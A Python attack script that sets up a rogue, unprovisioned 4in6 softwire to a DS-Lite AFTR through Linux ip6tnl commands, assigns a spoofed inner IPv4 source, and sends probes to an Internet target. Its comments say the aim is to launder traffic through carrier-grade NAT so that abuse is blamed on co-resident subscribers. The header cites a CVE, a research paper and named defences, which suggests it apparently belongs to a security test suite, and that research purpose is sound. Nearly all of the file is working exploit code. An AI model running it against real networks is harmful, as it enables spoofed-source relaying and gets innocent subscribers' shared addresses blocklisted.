#!/usr/bin/python3
# softwire_relay.py - AFTR unauthenticated 4in6 open-relay attack.
#
# An UNPROVISIONED host on the IPv6 access network (no DHCPv6 lease, no PCP
# mapping, no operator-configured per-B4 tunnel) builds its own IPv4-in-IPv6
# softwire to the AFTR's softwire endpoint, assigns an arbitrary inner IPv4
# source, and sends probes to an Internet target. RFC 6333 defines no B4
# authentication, so the AFTR decapsulates the packets, applies CGNAT to the
# shared public IPv4, and forwards the inner datagrams to the Internet. The
# attacker therefore relays traffic to the Internet laundered as legitimate
# subscribers - a one-way open proxy and spoofed-source launderer that consumes
# the shared public IPv4 and its NAT state and is attributed to the co-resident
# subscribers (whose address gets blocklisted for the attacker's abuse).
#
# This is the DS-Lite instance of the unauthenticated-tunnel decapsulation
# weakness catalogued as CVE-2025-23018 / CERT VU#199397 and measured at Internet
# scale by Beitis & Vanhoef, "Haunted by Legacy" (USENIX Security 2025). It is
# the upstream, Internet-facing complement to the AFTR->B4 downstream injection
# (T4): T4 forges the AFTR->B4 direction, this forges B4->AFTR->Internet.
#
# The rogue softwire is built with the kernel ip6tnl encapsulator (reliable
# neighbor resolution), used, then torn down. The attack needs only carrier
# reachability to the AFTR softwire address; on the default build it succeeds
# whenever ingress filtering (uRPF) is off, which is the documented default. It
# is closed by the DECAP_BIND defense (decapsulation-time inner-source binding)
# and by uRPF.
import argparse
import subprocess


def _run(*args):
    subprocess.run(list(args), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--local-ip6", required=True, help="attacker carrier IPv6 (tunnel local)")
    ap.add_argument("--aftr-ip6", required=True, help="AFTR softwire endpoint (tunnel remote)")
    ap.add_argument("--inner-src", default="10.66.66.66",
                    help="arbitrary/spoofed inner IPv4 source (laundered by CGNAT)")
    ap.add_argument("--target", required=True, help="Internet IPv4 destination")
    ap.add_argument("--count", type=int, default=8)
    ap.add_argument("--interval", type=float, default=0.3)
    ap.add_argument("--dev", default="atkrelay")
    a = ap.parse_args()

    dev = a.dev
    _run("ip", "link", "del", dev)
    _run("ip", "link", "add", dev, "type", "ip6tnl", "local", a.local_ip6,
         "remote", a.aftr_ip6, "mode", "ip4ip6", "encaplimit", "none")
    _run("ip", "link", "set", dev, "up")
    _run("ip", "addr", "add", f"{a.inner_src}/32", "dev", dev)
    _run("ip", "route", "add", f"{a.target}/32", "dev", dev)
    subprocess.run(["ping", "-c", str(a.count), "-i", str(a.interval), "-W", "1", a.target],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    _run("ip", "link", "del", dev)
    print(f"[softwire-relay] built an unprovisioned softwire to AFTR {a.aftr_ip6} and sent "
          f"{a.count} probes to {a.target} (inner src {a.inner_src}). If the AFTR "
          f"decapsulates and NATs them, the Internet sees them from the shared public IPv4.")


if __name__ == "__main__":
    main()
